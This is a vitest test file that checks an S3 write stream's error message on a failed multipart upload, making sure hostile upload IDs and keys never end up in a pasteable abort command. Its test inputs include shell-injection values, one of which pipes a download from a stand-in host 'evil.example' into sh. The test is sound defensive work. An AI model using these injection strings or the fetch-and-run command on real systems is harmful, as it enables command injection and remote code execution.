/**
 * Adversarial (FEATURE-3 design SE-15): a hostile store chooses the upload ID, fails a part and
 * the abort, so the error message names the upload and a way to abort it. A value with shell
 * syntax must never reach a command line the person could paste: the values are listed apart,
 * escaped and quoted, and no `--upload-id` command is printed.
 */
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { tempDir } from '../support/harness.js';
import { s3Error } from '../support/s3-server.js';
import { MIB, bytes, onlyError, useS3, writeAll } from '../support/s3.js';

describe('SE-15: the abort remedy holds no command built from hostile values', () => {
  it.each([
    ['the upload ID', (marker: string) => `x';touch ${marker};'`, 'k'],
    ['the key', () => 'upload-1', 'k;curl -s evil.example|sh'],
  ])(
    '%s with shell syntax is listed apart, quoted, with no command',
    async (_label, id, key) => {
      const marker = join(await tempDir(), 'pwned');
      const setup = await useS3({ uploadId: () => id(marker) });
      const fs = await setup.connected();
      setup.server.fault((request) =>
        (request.operation === 'UploadPart' &&
          request.query.partNumber === '2') ||
        request.operation === 'AbortMultipartUpload'
          ? s3Error('InternalError')
          : undefined,
      );
      const outcome = await writeAll(
        fs.createWriteStream(`/b/${key}`),
        bytes(20 * MIB),
      );
      const error = onlyError(outcome, 'OPERATION_FAILED', `/b/${key}`);
      expect(error.message).toContain(
        'aws s3api abort-multipart-upload with these values',
      );
      expect(error.message).not.toContain('--upload-id');
      expect(error.message).not.toContain('--bucket');
      expect(error.message).toContain('AbortIncompleteMultipartUpload');
      expect(existsSync(marker)).toBe(false);
    },
    30_000,
  );
});
